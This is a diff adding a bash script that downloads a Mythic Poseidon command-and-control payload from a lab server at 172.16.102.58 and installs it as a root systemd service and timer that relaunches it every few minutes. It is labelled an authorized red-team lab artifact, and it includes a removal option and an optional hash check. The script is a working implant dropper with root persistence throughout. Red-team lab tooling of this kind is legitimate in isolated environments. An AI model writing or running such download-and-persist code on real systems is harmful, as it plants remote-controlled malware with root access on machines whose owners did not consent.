@@ -1,0 +1,251 @@
+#!/usr/bin/env bash
+set -Eeuo pipefail
+
+# Installs a freshly generated Mythic Poseidon payload as a recurring systemd
+# lab artifact. Use only on an authorized, isolated, disposable Linux system.
+
+DOWNLOAD_URL="${POSEIDON_DOWNLOAD_URL:-http://172.16.102.58:8087/poseidon.bin}"
+INSTALL_DIRECTORY="${POSEIDON_INSTALL_DIRECTORY:-/var/lib/redhavi}"
+INTERVAL_MINUTES="${POSEIDON_INTERVAL_MINUTES:-3}"
+EXPECTED_SHA256="${POSEIDON_EXPECTED_SHA256:-}"
+SERVICE_NAME="redhavi-poseidon.service"
+TIMER_NAME="redhavi-poseidon.timer"
+REMOVE=0
+
+EXECUTABLE_PATH=""
+SERVICE_PATH=""
+TIMER_PATH=""
+TEMP_DOWNLOAD=""
+TEMP_SERVICE=""
+TEMP_TIMER=""
+
+usage() {
+    cat <<'EOF'
+Usage: sudo redhavi-poseidon [options]
+
+Downloads a newly generated Mythic Poseidon payload from an external lab
+server and creates a systemd timer that attempts to run it periodically.
+An already running service is not started a second time.
+
+Options:
+  --download-url URL       Payload URL.
+  --install-directory DIR  Installation directory (default: /var/lib/redhavi).
+  --interval-minutes N     Timer interval from 1 to 1440 minutes (default: 3).
+  --expected-sha256 HASH   Require the downloaded file to match this SHA-256.
+  --remove                 Remove the timer, service, and installed payload.
+  -h, --help               Show this help message.
+
+Environment variables:
+  POSEIDON_DOWNLOAD_URL
+  POSEIDON_INSTALL_DIRECTORY
+  POSEIDON_INTERVAL_MINUTES
+  POSEIDON_EXPECTED_SHA256
+
+The repository's poseidon.bin is a zero-byte placeholder. Generate a new
+payload in Mythic and host it on the authorized external lab server.
+EOF
+}
+
+log() {
+    printf '[poseidon] %s\n' "$*"
+}
+
+die() {
+    printf '[poseidon][ERROR] %s\n' "$*" >&2
+    exit 1
+}
+
+cleanup_temporary_files() {
+    local path
+
+    for path in "$TEMP_DOWNLOAD" "$TEMP_SERVICE" "$TEMP_TIMER"; do
+        if [ -n "$path" ] && [ -e "$path" ]; then
+            rm -f -- "$path"
+        fi
+    done
+}
+
+trap cleanup_temporary_files EXIT
+
+parse_args() {
+    while [ "$#" -gt 0 ]; do
+        case "$1" in
+            --download-url)
+                [ "$#" -ge 2 ] || die "--download-url requires a value."
+                DOWNLOAD_URL=$2
+                shift 2
+                ;;
+            --install-directory)
+                [ "$#" -ge 2 ] || die "--install-directory requires a value."
+                INSTALL_DIRECTORY=$2
+                shift 2
+                ;;
+            --interval-minutes)
+                [ "$#" -ge 2 ] || die "--interval-minutes requires a value."
+                INTERVAL_MINUTES=$2
+                shift 2
+                ;;
+            --expected-sha256)
+                [ "$#" -ge 2 ] || die "--expected-sha256 requires a value."
+                EXPECTED_SHA256=$2
+                shift 2
+                ;;
+            --remove)
+                REMOVE=1
+                shift
+                ;;
+            -h|--help)
+                usage
+                exit 0
+                ;;
+            *)
+                die "Unknown option: $1"
+                ;;
+        esac
+    done
+}
+
+require_root() {
+    [ "$(id -u)" -eq 0 ] || die "Run this script as root."
+}
+
+require_command() {
+    command -v "$1" >/dev/null 2>&1 || die "Required command is unavailable: $1"
+}
+
+validate_settings() {
+    [[ "$DOWNLOAD_URL" =~ ^https?://[^[:space:]]+$ ]] \
+        || die "The download URL must be an HTTP(S) URL without spaces."
+    [[ "$INSTALL_DIRECTORY" = /* ]] \
+        || die "The installation directory must be an absolute path."
+    [ "$INSTALL_DIRECTORY" != "/" ] \
+        || die "The filesystem root cannot be used as the installation directory."
+    [[ "$INSTALL_DIRECTORY" != *[[:space:]]* ]] \
+        || die "The installation directory cannot contain whitespace."
+    [[ "$INTERVAL_MINUTES" =~ ^[0-9]+$ ]] \
+        || die "The interval must be an integer."
+    [ "$INTERVAL_MINUTES" -ge 1 ] && [ "$INTERVAL_MINUTES" -le 1440 ] \
+        || die "The interval must be between 1 and 1440 minutes."
+    if [ -n "$EXPECTED_SHA256" ]; then
+        [[ "$EXPECTED_SHA256" =~ ^[A-Fa-f0-9]{64}$ ]] \
+            || die "The expected SHA-256 must contain exactly 64 hexadecimal characters."
+    fi
+
+    EXECUTABLE_PATH="$INSTALL_DIRECTORY/poseidon.bin"
+    SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME"
+    TIMER_PATH="/etc/systemd/system/$TIMER_NAME"
+}
+
+remove_poseidon() {
+    systemctl disable --now "$TIMER_NAME" >/dev/null 2>&1 || true
+    systemctl stop "$SERVICE_NAME" >/dev/null 2>&1 || true
+
+    if [ -e "$TIMER_PATH" ]; then
+        rm -f -- "$TIMER_PATH"
+        log "Timer removed: $TIMER_NAME"
+    fi
+    if [ -e "$SERVICE_PATH" ]; then
+        rm -f -- "$SERVICE_PATH"
+        log "Service removed: $SERVICE_NAME"
+    fi
+    if [ -e "$EXECUTABLE_PATH" ]; then
+        rm -f -- "$EXECUTABLE_PATH"
+        log "Payload removed: $EXECUTABLE_PATH"
+    fi
+
+    systemctl daemon-reload
+    systemctl reset-failed "$SERVICE_NAME" >/dev/null 2>&1 || true
+}
+
+download_payload() {
+    local actual_sha256
+
+    install -d -m 0750 "$INSTALL_DIRECTORY"
+    TEMP_DOWNLOAD="$(mktemp "$INSTALL_DIRECTORY/.poseidon.bin.XXXXXX")"
+
+    log "Downloading $DOWNLOAD_URL ..."
+    curl --fail --silent --show-error --location \
+        --retry 3 --connect-timeout 10 --max-time 120 \
+        --output "$TEMP_DOWNLOAD" "$DOWNLOAD_URL"
+
+    [ -s "$TEMP_DOWNLOAD" ] || die "The download produced an empty file."
+    actual_sha256="$(sha256sum "$TEMP_DOWNLOAD" | awk '{print $1}')"
+    if [ -n "$EXPECTED_SHA256" ] \
+        && [ "$actual_sha256" != "${EXPECTED_SHA256,,}" ]; then
+        die "Unexpected SHA-256. Expected: $EXPECTED_SHA256; received: $actual_sha256"
+    fi
+
+    chown root:root "$TEMP_DOWNLOAD"
+    chmod 0700 "$TEMP_DOWNLOAD"
+    mv -f -- "$TEMP_DOWNLOAD" "$EXECUTABLE_PATH"
+    TEMP_DOWNLOAD=""
+
+    log "Installed at $EXECUTABLE_PATH"
+    log "SHA-256: $actual_sha256"
+}
+
+write_systemd_units() {
+    TEMP_SERVICE="$(mktemp)"
+    TEMP_TIMER="$(mktemp)"
+
+    cat >"$TEMP_SERVICE" <<EOF
+[Unit]
+Description=Redhavi Poseidon authorized lab artifact
+After=network-online.target
+Wants=network-online.target
+ConditionPathIsExecutable=$EXECUTABLE_PATH
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=$INSTALL_DIRECTORY
+ExecStart=$EXECUTABLE_PATH
+TimeoutStopSec=15s
+EOF
+
+    cat >"$TEMP_TIMER" <<EOF
+[Unit]
+Description=Run the Redhavi Poseidon lab artifact periodically
+
+[Timer]
+OnBootSec=1min
+OnUnitInactiveSec=${INTERVAL_MINUTES}min
+AccuracySec=10s
+Persistent=true
+Unit=$SERVICE_NAME
+
+[Install]
+WantedBy=timers.target
+EOF
+
+    install -o root -g root -m 0644 "$TEMP_SERVICE" "$SERVICE_PATH"
+    install -o root -g root -m 0644 "$TEMP_TIMER" "$TIMER_PATH"
+    systemctl daemon-reload
+    systemctl enable --now "$TIMER_NAME"
+
+    log "Timer created: $TIMER_NAME (every $INTERVAL_MINUTES minutes as root)."
+    log "The first scheduled attempt occurs about one minute after installation."
+}
+
+main() {
+    local command_name
+
+    parse_args "$@"
+    require_root
+    require_command systemctl
+    validate_settings
+
+    if [ "$REMOVE" -eq 1 ]; then
+        remove_poseidon
+        return
+    fi
+
+    for command_name in awk chown chmod curl install mktemp mv sha256sum; do
+        require_command "$command_name"
+    done
+
+    download_payload
+    write_systemd_units
+}
+
+main "$@"
